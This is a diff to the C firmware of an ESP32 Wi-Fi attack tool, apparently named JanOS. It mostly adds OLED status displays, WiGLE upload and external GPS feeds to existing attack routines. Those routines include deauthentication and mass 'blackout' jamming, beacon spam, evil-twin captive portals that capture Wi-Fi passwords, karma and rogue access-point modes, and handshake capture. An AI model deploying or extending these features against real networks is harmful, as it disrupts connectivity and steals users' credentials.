@@ -9,6 +9,7 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <ctype.h>
+#include <limits.h>
 
 #include "esp_heap_caps.h"
 #include "esp_psram.h"
@@ -46,8 +47,10 @@
 #include "esp_random.h"
 #include "mbedtls/ecp.h"
 #include "mbedtls/bignum.h"
+#include "mbedtls/base64.h"
 #include "mbedtls/ctr_drbg.h"
 #include "mbedtls/entropy.h"
+#include "mbedtls/base64.h"
 #include "esp_timer.h"
 #include "esp_app_format.h"
 
@@ -79,6 +82,7 @@
 #include "frame_analyzer_parser.h"
 #include "frame_analyzer_types.h"
 #include "sniffer.h"
+#include "oled_display.h"
 #include <math.h>
 
 // NimBLE includes for BLE scanning
@@ -108,7 +112,7 @@
 #endif
 
 //Version number
-#define JANOS_VERSION "1.5.3"
+#define JANOS_VERSION "1.5.5"
 
 #define OTA_GITHUB_OWNER "C5Lab"
 #define OTA_GITHUB_REPO "projectZero"
@@ -127,6 +131,16 @@
 #define WPASEC_NVS_KEY       "api_key"
 #define WPASEC_URL           "https://wpa-sec.stanev.org/"
 #define WPASEC_KEY_MAX_LEN   65
+
+// WiGLE cloud upload
+#define WIGLE_NVS_NAMESPACE "wigle"
+#define WIGLE_NVS_KEY_NAME  "api_name"
+#define WIGLE_NVS_KEY_TOKEN "api_token"
+#define WIGLE_URL           "https://api.wigle.net/api/v2/file/upload"
+#define WIGLE_KEY_MAX_LEN   65
+
+#define DISPLAY_NVS_NAMESPACE "display"
+#define DISPLAY_NVS_KEY_MODE  "mode"
 
 
 
@@ -230,12 +244,19 @@ typedef struct {
 typedef enum {
     GPS_MODULE_ATGM336H = 0,
     GPS_MODULE_M5STACK_GPS_V11 = 1,
+    GPS_MODULE_EXTERNAL = 2,
+    GPS_MODULE_EXTERNAL_CAP = 3,
+    // Backward compatibility alias for previously exposed name.
+    GPS_MODULE_USB_TAB = GPS_MODULE_EXTERNAL,
+    GPS_MODULE_CAP = GPS_MODULE_EXTERNAL_CAP,
 } gps_module_t;
 
 // Wardrive state
 static bool wardrive_active = false;
 static int wardrive_file_counter = 1;
 static gps_data_t current_gps = {0};
+static gps_data_t external_gps_position = {0};
+static gps_data_t external_cap_gps_position = {0};
 static bool gps_uart_initialized = false;
 static gps_module_t current_gps_module = GPS_MODULE_ATGM336H;
 static volatile bool gps_raw_active = false;
@@ -248,6 +269,8 @@ static volatile int wifi_connect_result = 0;
 
 // WPA-SEC API key (loaded from NVS on boot)
 static char wpasec_api_key[WPASEC_KEY_MAX_LEN] = "";
+static char wigle_api_name[WIGLE_KEY_MAX_LEN] = "";
+static char wigle_api_token[WIGLE_KEY_MAX_LEN] = "";
 
 // ARP ban state
 static volatile bool arp_ban_active = false;
@@ -291,6 +314,9 @@ static int sniffer_current_channel = 1;
 static int sniffer_channel_index = 0;
 static int64_t sniffer_last_channel_hop = 0;
 static const int sniffer_channel_hop_delay_ms = 250; // 250ms per channel like Marauder
+// Sniffer OLED shared state (callback -> task)
+static volatile uint32_t sniff_oled_packets = 0;
+static volatile bool sniff_oled_dirty = false;
 static TaskHandle_t sniffer_channel_task_handle = NULL;
 static uint32_t sniffer_packet_counter = 0;
 static uint32_t sniffer_last_debug_packet = 0;
@@ -329,6 +355,13 @@ static volatile bool sniffer_dog_active = false;
 static int sniffer_dog_current_channel = 1;
 static int sniffer_dog_channel_index = 0;
 static int64_t sniffer_dog_last_channel_hop = 0;
+// Sniffer Dog OLED shared state (callback -> task)
+static volatile char sd_oled_ap[18] = {0};
+static volatile char sd_oled_sta[18] = {0};
+static volatile int  sd_oled_ch = 0;
+static volatile int  sd_oled_rssi = 0;
+static volatile uint32_t sd_oled_count = 0;
+static volatile bool sd_oled_dirty = false;
 
 // Deauth detector task
 static TaskHandle_t deauth_detector_task_handle = NULL;
@@ -336,6 +369,13 @@ static volatile bool deauth_detector_active = false;
 static int deauth_detector_current_channel = 1;
 static int deauth_detector_channel_index = 0;
 static int64_t deauth_detector_last_channel_hop = 0;
+// Deauth detector OLED shared state (callback -> task)
+static volatile char dd_oled_ssid[22] = {0};
+static volatile char dd_oled_bssid[18] = {0};
+static volatile int  dd_oled_ch = 0;
+static volatile int  dd_oled_rssi = 0;
+static volatile uint32_t dd_oled_count = 0;
+static volatile bool dd_oled_dirty = false;
 // Deauth detector selected mode
 static bool deauth_detector_selected_mode = false;
 static int deauth_detector_selected_channels[MAX_AP_CNT];
@@ -349,6 +389,7 @@ static TaskHandle_t wardrive_task_handle = NULL;
 static TaskHandle_t handshake_attack_task_handle = NULL;
 static volatile bool handshake_attack_active = false;
 static bool handshake_selected_mode = false; // true if networks were selected, false for scan-all mode
+static bool handshake_serial_mode = false;   // true = dump pcap/hccapx via serial (base64) instead of SD
 static wifi_ap_record_t *handshake_targets = NULL;          // ~6.4 KB in PSRAM
 static int handshake_target_count = 0;
 static bool handshake_captured[MAX_AP_CNT]; // Track which networks have captured handshakes
@@ -427,6 +468,8 @@ static const uint8_t channels_5ghz[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104
 // Portal state
 static httpd_handle_t portal_server = NULL;
 static volatile bool portal_active = false;
+static volatile bool karma_mode_active = false;
+static volatile bool rogueap_mode_active = false;
 static TaskHandle_t dns_server_task_handle = NULL;
 static int dns_server_socket = -1;
 static TaskHandle_t boot_button_task_handle = NULL;
@@ -848,6 +891,19 @@ static void beacon_spam_task(void *pvParameters) {
                     send_beacon_frame(frame_buffer, frame_size);
                 }
                 
+                {
+                    static int64_t bcn_oled_last_us = 0;
+                    int64_t bcn_now_us = esp_timer_get_time();
+                    if (bcn_now_us - bcn_oled_last_us > 400000) {
+                        bcn_oled_last_us = bcn_now_us;
+                        char bcn_l2[64], bcn_l3[64], bcn_l4[64];
+                        snprintf(bcn_l2, sizeof(bcn_l2), ">> %s", beacon_ssids[i]);
+                        snprintf(bcn_l3, sizeof(bcn_l3), "  Ch %d/13", current_channel);
+                        snprintf(bcn_l4, sizeof(bcn_l4), "  %d SSIDs TX", beacon_ssid_count);
+                        oled_display_update_full("> Beacon Spam", bcn_l2, bcn_l3, bcn_l4);
+                    }
+                }
+                
                 // Fast delay between beacons (10ms for faster transmission)
                 vTaskDelay(pdMS_TO_TICKS(10));
             }
@@ -1072,6 +1128,13 @@ static void led_boot_sequence(void) {
 static char (*sd_html_files)[MAX_HTML_FILENAME] = NULL;     // ~3.2 KB in PSRAM
 static int sd_html_count = 0;
 static char* custom_portal_html = NULL;
+// Chunked base64 HTML transfer buffer (allocated in PSRAM to avoid DRAM fragmentation)
+static char *html_b64_buf = NULL;       // accumulator for base64 chunks
+static size_t html_b64_len = 0;        // current length in accumulator
+static size_t html_b64_cap = 0;        // allocated capacity
+static bool   html_b64_active = false; // true between set_html_begin / set_html_end
+#define HTML_B64_ALLOC     (1024*1024) // 1 MB base64 buffer in PSRAM (~768 KB decoded HTML)
+#define HTML_MAX_DECODED   (800*1024)  // 800 KB max decoded HTML
 static bool sd_card_mounted = false;
 static sdmmc_card_t *sd_card_handle = NULL;
 #define MAX_SSID_PRESETS 64
@@ -1170,6 +1233,7 @@ static bool vendor_last_valid = false;
 static bool vendor_last_hit = false;
 static bool vendor_lookup_enabled = false;
 static size_t vendor_record_count = 0;
+static display_type_t display_forced_mode = DISPLAY_NONE; /* DISPLAY_NONE = auto */
 
 
 // Methods forward declarations
@@ -1182,9 +1246,12 @@ static int cmd_unselect_stations(int argc, char **argv);
 static int cmd_start_beacon_spam(int argc, char **argv);
 static int cmd_start_evil_twin(int argc, char **argv);
 static int cmd_start_handshake(int argc, char **argv);
+static int cmd_start_handshake_serial(int argc, char **argv);
 static int cmd_save_handshake(int argc, char **argv);
 static int cmd_start_gps_raw(int argc, char **argv);
 static int cmd_gps_set(int argc, char **argv);
+static int cmd_set_gps_position(int argc, char **argv);
+static int cmd_set_gps_position_cap(int argc, char **argv);
 static int cmd_start_wardrive(int argc, char **argv);
 static int cmd_start_sniffer(int argc, char **argv);
 static int cmd_start_sniffer_noscan(int argc, char **argv);
@@ -1208,6 +1275,9 @@ static int cmd_list_sd(int argc, char **argv);
 static int cmd_list_dir(int argc, char **argv);
 static int cmd_list_ssid(int argc, char **argv);
 static int cmd_select_html(int argc, char **argv);
+static int cmd_set_html(int argc, char **argv);
+static int cmd_set_html_begin(int argc, char **argv);
+static int cmd_set_html_end(int argc, char **argv);
 static int cmd_show_pass(int argc, char **argv);
 static int cmd_file_delete(int argc, char **argv);
 static int cmd_stop(int argc, char **argv);
@@ -1219,9 +1289,12 @@ static void arp_ban_task(void *pvParameters);
 static int cmd_reboot(int argc, char **argv);
 static int cmd_led(int argc, char **argv);
 static int cmd_vendor(int argc, char **argv);
+static int cmd_display(int argc, char **argv);
 static int cmd_download(int argc, char **argv);
 static int cmd_wpasec_key(int argc, char **argv);
 static int cmd_wpasec_upload(int argc, char **argv);
+static int cmd_wigle_key(int argc, char **argv);
+static int cmd_wigle_upload(int argc, char **argv);
 static int cmd_channel_time(int argc, char **argv);
 static int cmd_ota_check(int argc, char **argv);
 static int cmd_ota_list(int argc, char **argv);
@@ -1248,6 +1321,10 @@ static bool check_handshake_file_exists(const char *ssid);
 static bool check_handshake_file_exists_by_bssid(const uint8_t *bssid);
 static void handshake_cleanup(void);
 static void attack_network_with_burst(const wifi_ap_record_t *ap);
+static const char *display_mode_to_str(display_type_t mode);
+static bool display_mode_from_str(const char *s, display_type_t *out_mode);
+static void display_mode_load_from_nvs(void);
+static void display_mode_save_to_nvs(display_type_t mode);
 // D-UCB and sniffer handshake helpers
 static void ducb_init(void);
 static int ducb_select_channel(void);
@@ -1313,6 +1390,11 @@ static void add_client_to_ap(int ap_index, const uint8_t *client_mac, int rssi);
 // Wardrive functions
 static esp_err_t init_gps_uart(int baud_rate);
 static int gps_get_baud_for_module(gps_module_t module);
+static const char *gps_get_module_name(gps_module_t module);
+static bool gps_module_uses_external_feed(gps_module_t module);
+static bool gps_module_uses_external_cap_feed(gps_module_t module);
+static const char *gps_external_position_command_name(gps_module_t module);
+static void gps_sync_from_selected_external_source(void);
 static void gps_load_state_from_nvs(void);
 static void gps_save_state_to_nvs(void);
 static esp_err_t init_sd_card(void);
@@ -1324,6 +1406,11 @@ static void get_timestamp_string(char* buffer, size_t size);
 static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode);
 static bool wait_for_gps_fix(int timeout_seconds);
 static int find_next_wardrive_file_number(void);
+static bool wigle_split_key_pair(const char *input,
+                                 char *api_name,
+                                 size_t api_name_sz,
+                                 char *api_token,
+                                 size_t api_token_sz);
 // Portal data logging functions
 static void save_evil_twin_password(const char* ssid, const char* password);
 static void save_portal_data(const char* ssid, const char* form_data);
@@ -1451,6 +1538,7 @@ static void wifi_event_handler(void *event_handler_arg,
             // If portal is active (Evil Twin attack), shut it down after successful connection
             if (portal_active) {
                 MY_LOG_INFO(TAG, "Password verified! Shutting down Evil Twin portal...");
+                oled_display_update_full("> Evil Twin", "  PASSWORD OK!", "  Saving to SD", "  >> Success!");
                 portal_active = false;
                 
                 // Stop DNS server task
@@ -1515,6 +1603,15 @@ static void wifi_event_handler(void *event_handler_arg,
             // Increment connected clients counter
             portal_connected_clients++;
             MY_LOG_INFO(TAG, "Portal: Client count = %d", portal_connected_clients);
+            
+            // OLED update for portal/karma/rogueap client connect (not evil twin - that's handled in deauth task)
+            if (portal_active && !evilTwinSSID) {
+                const char *mode_name = karma_mode_active ? "> Karma Attack" :
+                                        rogueap_mode_active ? "> Rogue AP" : "> Captive Portal";
+                char p_l4[64];
+                snprintf(p_l4, sizeof(p_l4), "  Clients: %d", portal_connected_clients);
+                oled_display_update_full(mode_name, portalSSID ? portalSSID : "", "  Client joined!", p_l4);
+            }
             
             // During evil twin attack, switch to first selected network's channel
             if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) && 
@@ -1582,6 +1679,21 @@ static void wifi_event_handler(void *event_handler_arg,
             
             g_scan_done = true;
             g_scan_in_progress = false;
+
+            // Update OLED with scan results (only if not suppressed / in sniffer)
+            if (!suppress_scan_logs && !sniffer_active) {
+                char oled_l2[32];
+                snprintf(oled_l2, sizeof(oled_l2), "  Found %u APs", g_scan_count);
+                char oled_l3[32];
+                if (g_scan_start_time_us > 0) {
+                    int64_t elapsed_us = esp_timer_get_time() - g_scan_start_time_us;
+                    float elapsed_s = elapsed_us / 1000000.0f;
+                    snprintf(oled_l3, sizeof(oled_l3), "  %.1fs elapsed", elapsed_s);
+                } else {
+                    oled_l3[0] = '\0';
+                }
+                oled_display_update_full("> Scan Complete", oled_l2, oled_l3, "  > select next");
+            }
             
             // Only reset applicationState to IDLE if not in active attack mode
             if (applicationState != DEAUTH && applicationState != DEAUTH_EVIL_TWIN && applicationState != EVIL_TWIN_PASS_CHECK) {
@@ -1642,6 +1754,11 @@ static void wifi_event_handler(void *event_handler_arg,
                 ESP_LOGW(TAG, "Evil twin: connection failed, wrong password? Btw connectAttemptCount: %d", connectAttemptCount);
                 if (connectAttemptCount >= 3) {
                     ESP_LOGW(TAG, "Evil twin: Too many failed attempts, giving up and going to DEAUTH_EVIL_TWIN. Btw connectAttemptCount: %d ", connectAttemptCount);
+                    {
+                        char et_l2[64];
+                        snprintf(et_l2, sizeof(et_l2), ">> %s", evilTwinSSID ? evilTwinSSID : "?");
+                        oled_display_update_full("> Evil Twin", et_l2, "  Wrong password!", "  Resuming...");
+                    }
                     applicationState = DEAUTH_EVIL_TWIN; //go back to deauth
                     
                     // Mark password as wrong for portal feedback
@@ -2263,6 +2380,12 @@ static void verify_password(const char* password) {
 
     MY_LOG_INFO(TAG, "Password received: %s", password);
 
+    {
+        char et_l2[64];
+        snprintf(et_l2, sizeof(et_l2), ">> %s", evilTwinSSID ? evilTwinSSID : "?");
+        oled_display_update_full("> Evil Twin", et_l2, "  Got password!", "  Verifying...");
+    }
+
     // Stop deauth attack BEFORE attempting to connect
     // This is crucial because deauth task switches channels which prevents stable STA connection
     if (deauth_attack_active || deauth_attack_task_handle != NULL) {
@@ -2368,6 +2491,44 @@ static bool wpasec_save_key_to_nvs(const char *key) {
     }
 
     err = nvs_set_str(handle, WPASEC_NVS_KEY, key);
+    if (err == ESP_OK) {
+        err = nvs_commit(handle);
+    }
+    nvs_close(handle);
+    return err == ESP_OK;
+}
+
+static void wigle_load_key_from_nvs(void) {
+    nvs_handle_t handle;
+    esp_err_t err = nvs_open(WIGLE_NVS_NAMESPACE, NVS_READONLY, &handle);
+    if (err != ESP_OK) {
+        return;
+    }
+
+    size_t name_len = sizeof(wigle_api_name);
+    size_t token_len = sizeof(wigle_api_token);
+    err = nvs_get_str(handle, WIGLE_NVS_KEY_NAME, wigle_api_name, &name_len);
+    if (err != ESP_OK) {
+        wigle_api_name[0] = '\0';
+    }
+    err = nvs_get_str(handle, WIGLE_NVS_KEY_TOKEN, wigle_api_token, &token_len);
+    if (err != ESP_OK) {
+        wigle_api_token[0] = '\0';
+    }
+    nvs_close(handle);
+}
+
+static bool wigle_save_key_to_nvs(const char *api_name, const char *api_token) {
+    nvs_handle_t handle;
+    esp_err_t err = nvs_open(WIGLE_NVS_NAMESPACE, NVS_READWRITE, &handle);
+    if (err != ESP_OK) {
+        return false;
+    }
+
+    err = nvs_set_str(handle, WIGLE_NVS_KEY_NAME, api_name);
+    if (err == ESP_OK) {
+        err = nvs_set_str(handle, WIGLE_NVS_KEY_TOKEN, api_token);
+    }
     if (err == ESP_OK) {
         err = nvs_commit(handle);
     }
@@ -2998,6 +3159,104 @@ static esp_err_t vendor_set_enabled(bool enabled) {
     return ESP_OK;
 }
 
+static const char *display_mode_to_str(display_type_t mode)
+{
+    switch (mode) {
+    case DISPLAY_SSD1306: return "ssd1306";
+    case DISPLAY_SH1107:  return "sh1107";
+    case DISPLAY_SH1106:  return "sh1106";
+    case DISPLAY_UNIT_LCD:return "unit_lcd";
+    case DISPLAY_NONE:
+    default:
+        return "auto";
+    }
+}
+
+static bool display_mode_from_str(const char *s, display_type_t *out_mode)
+{
+    if (!s || !out_mode) return false;
+    if (strcasecmp(s, "auto") == 0) {
+        *out_mode = DISPLAY_NONE;
+        return true;
+    }
+    if (strcasecmp(s, "ssd1306") == 0) {
+        *out_mode = DISPLAY_SSD1306;
+        return true;
+    }
+    if (strcasecmp(s, "sh1107") == 0) {
+        *out_mode = DISPLAY_SH1107;
+        return true;
+    }
+    if (strcasecmp(s, "sh1106") == 0) {
+        *out_mode = DISPLAY_SH1106;
+        return true;
+    }
+    if (strcasecmp(s, "unit_lcd") == 0 || strcasecmp(s, "lcd") == 0) {
+        *out_mode = DISPLAY_UNIT_LCD;
+        return true;
+    }
+    return false;
+}
+
+static void display_mode_save_to_nvs(display_type_t mode)
+{
+    nvs_handle_t handle;
+    esp_err_t err = nvs_open(DISPLAY_NVS_NAMESPACE, NVS_READWRITE, &handle);
+    if (err != ESP_OK) {
+        ESP_LOGW(TAG, "Display NVS open failed: %s", esp_err_to_name(err));
+        return;
+    }
+    err = nvs_set_u8(handle, DISPLAY_NVS_KEY_MODE, (uint8_t)mode);
+    if (err == ESP_OK) {
+        err = nvs_commit(handle);
+    }
+    if (err != ESP_OK) {
+        ESP_LOGW(TAG, "Display NVS write failed: %s", esp_err_to_name(err));
+    }
+    nvs_close(handle);
+}
+
+static void display_mode_load_from_nvs(void)
+{
+    nvs_handle_t handle;
+    esp_err_t err = nvs_open(DISPLAY_NVS_NAMESPACE, NVS_READONLY, &handle);
+    if (err == ESP_ERR_NVS_NOT_FOUND) {
+        display_forced_mode = DISPLAY_NONE;
+        return;
+    }
+    if (err != ESP_OK) {
+        ESP_LOGW(TAG, "Display NVS read open failed: %s", esp_err_to_name(err));
+        display_forced_mode = DISPLAY_NONE;
+        return;
+    }
+
+    uint8_t raw = (uint8_t)DISPLAY_NONE;
+    err = nvs_get_u8(handle, DISPLAY_NVS_KEY_MODE, &raw);
+    nvs_close(handle);
+    if (err == ESP_ERR_NVS_NOT_FOUND) {
+        display_forced_mode = DISPLAY_NONE;
+        return;
+    }
+    if (err != ESP_OK) {
+        ESP_LOGW(TAG, "Display NVS get failed: %s", esp_err_to_name(err));
+        display_forced_mode = DISPLAY_NONE;
+        return;
+    }
+
+    switch ((display_type_t)raw) {
+    case DISPLAY_NONE:
+    case DISPLAY_SSD1306:
+    case DISPLAY_SH1107:
+    case DISPLAY_SH1106:
+    case DISPLAY_UNIT_LCD:
+        display_forced_mode = (display_type_t)raw;
+        break;
+    default:
+        display_forced_mode = DISPLAY_NONE;
+        break;
+    }
+}
+
 static bool boot_is_command_allowed(const char* command) {
     if (command == NULL || command[0] == '\0') {
         return false;
@@ -3356,9 +3615,61 @@ static void print_scan_results(void) {
     MY_LOG_INFO(TAG, "Scan results printed.");
 }
 
+// --- OLED display helper functions ---
+
+/**
+ * Build a target summary for OLED line2.
+ * 0 selected → "  No target"
+ * 1 selected → ">> HomeNet"
+ * 2 selected → ">> Net1, Net2"
+ * 3+ selected → ">> Net1 +2 more"
+ */
+static void oled_build_target_summary(char *buf, size_t sz)
+{
+    if (g_selected_count == 0 || !g_scan_done) {
+        snprintf(buf, sz, "  No target");
+        return;
+    }
+    const char *first = (const char *)g_scan_results[g_selected_indices[0]].ssid;
+    if (g_selected_count == 1) {
+        snprintf(buf, sz, ">> %s", first);
+    } else if (g_selected_count == 2) {
+        const char *second = (const char *)g_scan_results[g_selected_indices[1]].ssid;
+        snprintf(buf, sz, ">> %s, %s", first, second);
+    } else {
+        snprintf(buf, sz, ">> %s +%d more", first, g_selected_count - 1);
+    }
+}
+
+/**
+ * Build channel/auth info for OLED line3 from selected networks.
+ * Single: "  Ch 6 WPA2 -45dB"
+ * Multi:  "  Ch 1,6,11"
+ */
+static void oled_build_channel_info(char *buf, size_t sz)
+{
+    if (g_selected_count == 0 || !g_scan_done) {
+        buf[0] = '\0';
+        return;
+    }
+    if (g_selected_count == 1) {
+        const wifi_ap_record_t *ap = &g_scan_results[g_selected_indices[0]];
+        const char *auth = authmode_to_string(ap->authmode);
+        snprintf(buf, sz, "  Ch %d %s %ddB", ap->primary, auth, ap->rssi);
+    } else {
+        int len = snprintf(buf, sz, "  Ch ");
+        for (int i = 0; i < g_selected_count && len < (int)sz - 4; i++) {
+            const wifi_ap_record_t *ap = &g_scan_results[g_selected_indices[i]];
+            if (i > 0) len += snprintf(buf + len, sz - len, ",");
+            len += snprintf(buf + len, sz - len, "%d", ap->primary);
+        }
+    }
+}
+
 // --- CLI: commands ---
 static int cmd_scan_networks(int argc, char **argv) {
     (void)argc; (void)argv;
+    oled_display_update_full("> Scanning WiFi", "  All channels", "", "  Working...");
     log_memory_info("scan_networks");
     
     // Ensure WiFi is initialized
@@ -3427,6 +3738,7 @@ static int cmd_show_scan_results(int argc, char **argv) {
 }
 
 static int cmd_select_networks(int argc, char **argv) {
+    // Display will be updated after selection is done
     if (argc < 2) {
         ESP_LOGW(TAG,"Syntax: select_networks <index1> [index2] ...");
         return 1;
@@ -3485,6 +3797,17 @@ static int cmd_select_networks(int argc, char **argv) {
     vTaskDelay(pdMS_TO_TICKS(100));
     MY_LOG_INFO(TAG, "%s", buf);
     vTaskDelay(pdMS_TO_TICKS(100));
+
+    // Update OLED with rich target summary
+    {
+        char oled_l1[20];
+        snprintf(oled_l1, sizeof(oled_l1), "> %d Target%s", g_selected_count, g_selected_count > 1 ? "s" : "");
+        char oled_target[48];
+        oled_build_target_summary(oled_target, sizeof(oled_target));
+        char oled_ch[32];
+        oled_build_channel_info(oled_ch, sizeof(oled_ch));
+        oled_display_update_full(oled_l1, oled_target, oled_ch, "  > ready");
+    }
 
     return 0;
 }
@@ -3579,6 +3902,10 @@ static void deauth_attack_task(void *pvParameters) {
             // Set flag to suppress logs during periodic re-scan
             periodic_rescan_in_progress = true;
             
+            if (applicationState == DEAUTH) {
+                oled_display_update_full("> Deauth Attack", "  Re-scanning...", "  Channel check", "  Please wait");
+            }
+            
             // Set LED to yellow during re-scan
             esp_err_t led_err = led_set_color(255, 255, 0); // Yellow
             if (led_err != ESP_OK) {
@@ -3606,6 +3933,45 @@ static void deauth_attack_task(void *pvParameters) {
             ESP_ERROR_CHECK(led_set_color(0, 0, 255));
             wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
             ESP_ERROR_CHECK(led_clear());
+        }
+        
+        // Real-time OLED status update (rate-limited ~500ms)
+        {
+            static int64_t deauth_oled_last_us = 0;
+            static int deauth_oled_rotate = 0;
+            int64_t now_us = esp_timer_get_time();
+            if (now_us - deauth_oled_last_us > 500000 && target_bssid_count > 0) {
+                deauth_oled_last_us = now_us;
+                if (applicationState == DEAUTH) {
+                    int idx = deauth_oled_rotate % target_bssid_count;
+                    char l2[64], l3[64], l4[64];
+                    snprintf(l2, sizeof(l2), ">> %s", target_bssids[idx].ssid);
+                    snprintf(l3, sizeof(l3), "  Ch %d  [%d/%d]", target_bssids[idx].channel, idx + 1, target_bssid_count);
+                    if (selected_stations_count > 0) {
+                        snprintf(l4, sizeof(l4), "  STA:%02X:%02X:%02X",
+                                 selected_stations[0].mac[3], selected_stations[0].mac[4], selected_stations[0].mac[5]);
+                    } else {
+                        snprintf(l4, sizeof(l4), "  Deauthing...");
+                    }
+                    oled_display_update_full("> Deauth Attack", l2, l3, l4);
+                    deauth_oled_rotate++;
+                } else if (applicationState == DEAUTH_EVIL_TWIN) {
+                    char l2[64], l4[64];
+                    snprintf(l2, sizeof(l2), ">> %s", target_bssids[0].ssid);
+                    if (last_password_wrong) {
+                        snprintf(l4, sizeof(l4), "  Clients: %d", portal_connected_clients);
+                        oled_display_update_full("> Evil Twin", l2, "  Wrong password!", l4);
+                    } else {
+                        snprintf(l4, sizeof(l4), "  Clients: %d", portal_connected_clients);
+                        oled_display_update_full("> Evil Twin", l2, "  Portal active", l4);
+                    }
+                } else if (applicationState == EVIL_TWIN_PASS_CHECK) {
+                    char l2[64], l4[64];
+                    snprintf(l2, sizeof(l2), ">> %s", evilTwinSSID ? evilTwinSSID : "?");
+                    snprintf(l4, sizeof(l4), "  Attempt %d/3", connectAttemptCount + 1);
+                    oled_display_update_full("> Evil Twin", l2, "  Connecting...", l4);
+                }
+            }
         }
         
         // Delay and yield to allow UART console processing
@@ -3646,6 +4012,7 @@ static void blackout_attack_task(void *pvParameters) {
     // Main loop: continuously scan and attack for 3 minutes each cycle
     while (blackout_attack_active && !operation_stop_requested) {
         MY_LOG_INFO(TAG, "Starting blackout cycle: scanning all networks...");
+        oled_display_update_full("> Blackout Mode", "  Scanning...", "  Finding nets", "  Please wait");
         
         // Start background scan with fast timings
         esp_err_t scan_result = start_background_scan(FAST_SCAN_MIN_TIME, FAST_SCAN_MAX_TIME);
@@ -3716,6 +4083,12 @@ static void blackout_attack_task(void *pvParameters) {
         
         MY_LOG_INFO(TAG, "Starting deauth attack on  %d networks (except whitelist) for 100 cycles...", g_selected_count);
         
+        {
+            char bo_l2[64];
+            snprintf(bo_l2, sizeof(bo_l2), "  Found %d nets", g_selected_count);
+            oled_display_update_full("> Blackout Mode", bo_l2, "  Mass deauth", "  Starting...");
+        }
+        
         // Attack all networks for exactly 3 minutes (1800 cycles at 100ms each)
         int attack_cycles = 0;
         const int MAX_ATTACK_CYCLES = 100;
@@ -3736,6 +4109,15 @@ static void blackout_attack_task(void *pvParameters) {
                 ESP_LOGW(TAG, "Failed to clear LED during blackout attack: %s", esp_err_to_name(led_err));
             }
             
+            if (attack_cycles % 5 == 0 && target_bssid_count > 0) {
+                int idx = attack_cycles % target_bssid_count;
+                char bo_l2[64], bo_l3[64], bo_l4[64];
+                snprintf(bo_l2, sizeof(bo_l2), ">> %s", target_bssids[idx].ssid);
+                snprintf(bo_l3, sizeof(bo_l3), "  %d nets Cyc%d", g_selected_count, attack_cycles);
+                snprintf(bo_l4, sizeof(bo_l4), "  Ch %d Active", target_bssids[idx].channel);
+                oled_display_update_full("> Blackout Mode", bo_l2, bo_l3, bo_l4);
+            }
+            
             attack_cycles++;
             vTaskDelay(pdMS_TO_TICKS(100)); // 100ms delay between attack cycles
         }
@@ -3746,6 +4128,7 @@ static void blackout_attack_task(void *pvParameters) {
         }
         
         MY_LOG_INFO(TAG, "3-minute attack cycle completed, starting new scan...");
+        oled_display_update_full("> Blackout Mode", "  Cycle done", "  New scan...", "");
         
         // Immediately start next scan cycle (no waiting)
     }
@@ -4106,6 +4489,7 @@ static void wardrive_promisc_task(void *pvParameters) {
     (void)pvParameters;
 
     MY_LOG_INFO(TAG, "Wardrive promisc task started.");
+    const bool external_feed = gps_module_uses_external_feed(current_gps_module);
 
     esp_err_t led_err = led_set_color(255, 0, 255); // Magenta
     if (led_err != ESP_OK) {
@@ -4116,12 +4500,15 @@ static void wardrive_promisc_task(void *pvParameters) {
     MY_LOG_INFO(TAG, "Next wardrive file will be: w%d.log", file_number);
 
     MY_LOG_INFO(TAG, "Waiting for GPS fix (no timeout - use 'stop' to cancel)...");
+    oled_display_update_full("> Wardrive Pro", "  Waiting GPS...", "  No timeout", "  Use 'stop'");
     if (!wait_for_gps_fix(0)) {
         MY_LOG_INFO(TAG, "Warning: No GPS fix obtained, not continuing without GPS data - please ensure clear view of the sky and try again.");
+        oled_display_update_full("> Wardrive Pro", "  No GPS fix!", "  Stopping...", "");
         goto cleanup;
     }
     MY_LOG_INFO(TAG, "GPS fix obtained: Lat=%.7f Lon=%.7f",
                 current_gps.latitude, current_gps.longitude);
+    oled_display_update_full("> Wardrive Pro", "  GPS fix OK!", "  D-UCB scanning", "");
 
     wdp_seen_count = 0;
     wdp_dwell_new_networks = 0;
@@ -4148,11 +4535,42 @@ static void wardrive_promisc_task(void *pvParameters) {
     #define WDP_GPS_FIX_LOST_THRESHOLD 3
 
     while (wardrive_promisc_active && !operation_stop_requested) {
+        if (external_feed) {
+            gps_sync_from_selected_external_source();
+        }
+        if (external_feed && !current_gps.valid) {
+            MY_LOG_INFO(TAG, "GPS fix lost! Pausing wardrive...");
+            oled_display_update_full("> Wardrive Pro", "  GPS fix lost!", "  Pausing...", "");
+            esp_wifi_set_promiscuous(false);
+            while (!current_gps.valid && wardrive_promisc_active && !operation_stop_requested) {
+                gps_sync_from_selected_external_source();
+                vTaskDelay(pdMS_TO_TICKS(200));
+            }
+            if (!wardrive_promisc_active || operation_stop_requested) break;
+            MY_LOG_INFO(TAG, "GPS fix recovered: Lat=%.7f Lon=%.7f. Resuming wardrive.",
+                        current_gps.latitude, current_gps.longitude);
+            oled_display_update_full("> Wardrive Pro", "  GPS recovered!", "  Resuming...", "");
+            esp_wifi_set_promiscuous(true);
+        }
+
         int ch_idx = wdp_ducb_select_channel();
         int channel = wdp_ducb_channels[ch_idx].channel;
         int dwell_ms = wdp_get_dwell_ms(wdp_ducb_channels[ch_idx].tier);
 
         esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        
+        {
+            static int64_t wdp_oled_last_us = 0;
+            int64_t wdp_now_us = esp_timer_get_time();
+            if (wdp_now_us - wdp_oled_last_us > 2000000) {
+                wdp_oled_last_us = wdp_now_us;
+                char wdp_l2[64], wdp_l3[64], wdp_l4[64];
+                snprintf(wdp_l2, sizeof(wdp_l2), "  Ch %d  D-UCB", channel);
+                snprintf(wdp_l3, sizeof(wdp_l3), "  %d networks", wdp_seen_count);
+                snprintf(wdp_l4, sizeof(wdp_l4), "  GPS: %s", current_gps.valid ? "OK" : "LOST");
+                oled_display_update_full("> Wardrive Pro", wdp_l2, wdp_l3, wdp_l4);
+            }
+        }
 
         wdp_dwell_new_networks = 0;
 
@@ -4173,14 +4591,17 @@ static void wardrive_promisc_task(void *pvParameters) {
             esp_wifi_set_promiscuous(true);
         }
 
-        // Read GPS
